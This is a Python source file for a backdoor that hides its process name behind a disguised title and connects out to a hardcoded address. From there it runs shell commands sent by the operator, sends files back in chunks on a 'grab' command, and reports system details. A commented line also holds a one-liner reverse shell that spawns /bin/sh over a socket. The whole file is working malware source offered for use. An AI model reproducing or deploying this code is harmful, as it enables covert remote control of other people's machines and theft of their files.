import commands
import shutil
import socket 
import subprocess 
import os


import platform
import setproctitle

# Mask the backdoor process name
# Recommend something like "[kworker/0:0H]"
title = "backdoor"   #replace "backdoor" with your custom process title
setproctitle.setproctitle(title)

# In the transfer function, we first check if the file exisits in the first place, if not we will notify the attacker
# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('Unable to find out the file')



def connect():
	#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.11.0.202', 8081))
    
 

    while True: 
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break 


# if we received grab keyword from the attacker, then this is an indicator for
# file transfer operation, hence we will split the received commands into two
# parts, the second part which we interested in contains the file path, so we will
# store it into a variable called path and pass it to transfer function
            
# Remember the Formula is  grab*<File Path>
# Example:  grab*C:\Users\Ghost\Desktop\photo.jpeg

        elif 'grab' in command:            
            grab,path = command.split('*')
            
            try:                          # when it comes to low level file transfer, allot of things can go wrong, therefore
                                          # we use exception handling (try and except) to protect our script from being crashed
                                          # in case something went wrong, we will send the error that happened and pass the exception
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  # send the exception error
                pass

        elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
            code,directory = command.split(" ") # split up the received command based on space into two variables
            os.chdir(directory) # changing the directory
            # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
            s.send( "[+] CWD Is " + os.getcwd() )
            
        elif 'getenv' in command:
        	   s.send( "[+] Platform Is " + platform.platform()) 
        
        elif 'getuid' in command:
        		s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
        

        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()
